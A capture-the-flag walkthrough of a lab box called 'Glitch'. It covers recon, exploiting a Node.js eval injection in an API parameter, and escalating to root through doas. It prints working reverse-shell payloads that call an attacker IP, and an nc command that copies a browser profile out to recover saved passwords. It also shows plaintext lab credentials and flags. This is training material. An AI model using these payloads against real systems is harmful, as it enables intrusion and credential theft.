> Glitch

**export IP=10.10.8.41**

# Nmap

nmap -sC -sV -T4 -Pn -p- -vvv -oN nmap/initial $IP

```
80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: not allowed
```

# Gobuster

sudo gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x txt,php,sql,zip,bin,tar,cgi -o gobuster/initial

```
/img (Status: 301)
/js (Status: 301)
/secret (Status: 200)
/Secret (Status: 200)
```

# Nikto

nitko -h http://$IP

```
+ Cookie token created without the httponly flag
+ Allowed HTTP Methods: GET, HEAD 
+ OSVDB-3092: /secret/: This might be interesting...
+ 7889 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2021-04-04 02:11:29 (GMT-4) (2301 seconds)
```

Inspecting the page we can see a script

```
      function getAccess() {
        fetch('/api/access')
          .then((response) => response.json())
          .then((response) => {
            console.log(response);
          });
      }
```

Trying to navigate to /api/access we can get our access token in base64 and decoding it we get `this_is_not_real`. Changing the token value to found one we find another site now.

Now looking at the source-code we find anothe js. 

## script.js

```
(async function () {
  const container = document.getElementById('items');
  await fetch('/api/items') => Let's try to access this
    .then((response) => response.json())
    .then((response) => {
      response.sins.forEach((element) => {
        let el = `<div class="item sins"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
        container.insertAdjacentHTML('beforeend', el);
      });
      response.errors.forEach((element) => {
        let el = `<div class="item errors"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
        container.insertAdjacentHTML('beforeend', el);
      });
      response.deaths.forEach((element) => {
        let el = `<div class="item deaths"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
        container.insertAdjacentHTML('beforeend', el);
      });
    });

  const buttons = document.querySelectorAll('.btn');
  const items = document.querySelectorAll('.item');
  buttons.forEach((button) => {
    button.addEventListener('click', (event) => {
      event.preventDefault();
      const filter = event.target.innerText;
      items.forEach((item) => {
        if (filter === 'all') {
          item.style.display = 'flex';
        } else {
          if (item.classList.contains(filter)) {
            item.style.display = 'flex';
          } else {
            item.style.display = 'none';
          }
        }
      });
    });
  });
})();
```

Naviagting to /api/items we get a list of `sins`, `errors` and `deaths`.

## Hints

What other methods does the API accept?

Posting through curl we got a message

curl -X POST http://$IP/api/items

```
{"message":"there_is_a_glitch_in_the_matrix"}
```

Let's search for other methods using ffuf.

ffuf -w /usr/share/wordlists/dirb/common.txt -X POST -u http://10.10.15.186/api/items?FUZZ=teasasdasdasd -fs 45 -mc all 2>/dev/null

```
cmd                     [Status: 500, Size: 1090, Words: 55, Lines: 11]
Documents and Settings  [Status: 502, Size: 182, Words: 7, Lines: 8]
Program Files           [Status: 502, Size: 182, Words: 7, Lines: 8]
reports list            [Status: 502, Size: 182, Words: 7, Lines: 8]
```

When we supply a POST request to `/api/items?cmd=test` 

```
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>ReferenceError: tets is not defined<br> &nbsp; &nbsp;at eval (eval at router.post (/var/web/routes/api.js:25:60), &lt;anonymous&gt;:1:1)<br> &nbsp; &nbsp;at router.post (/var/web/routes/api.js:25:60)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/web/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/web/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/var/web/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at Function.handle (/var/web/node_modules/express/lib/router/index.js:174:3)</pre>
</body>
</html>
```

We have an eval error and this is NodeJS server. Looking at PayloadAllTheThings we have a payload.

## Payload

`require('child_process').exec('nc -e /bin/sh 10.8.107.21 4444')`

Let's URLencode it and pass it through cmd parameter. Now a post request to /api/items

```
POST /api/items?cmd=require("child_process").exec("%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%38%2e%31%30%37%2e%32%31%20%34%34%34%34%20%3e%2f%74%6d%70%2f%66") HTTP/1.1
```

Now we have a shell as user!!

# user.txt

```
THM{i_don't_know_why}
```

## Hints:  My friend says that sudo is bloat.

# LinPeas

```
[+] Checking doas.conf
permit v0id as root
```

doas (“do as”) is a program to execute commands as another user. The system administrator can configure it to give specified users privileges to execute specified commands. So, now we have to be a v0id.

# PrivEsc as v0id

We have .firefox file which may contain some information.

Let's transfer the .firefox cintents to our machine and try to get info.

## In attacking machine

1. mkdir firefox
2. cd firefox
3. nc -l 9002 |tar xf -

## In Box machine

1. cd /home/user/.firefox
2. tar cf - . | nc 10.8.107.21 9002

And now we can open firefox using the command

`firefox --profile b5w4643p.default-release/ --allow-downgrade`

We can see the saved logins and now we have some creds. `v0id`:`love_the_void`. Now we are in as v0id.

# Privilege Escalation

doas -u root bash => We are root!!

# root.txt

```
THM{diamonds_break_our_aching_minds}
```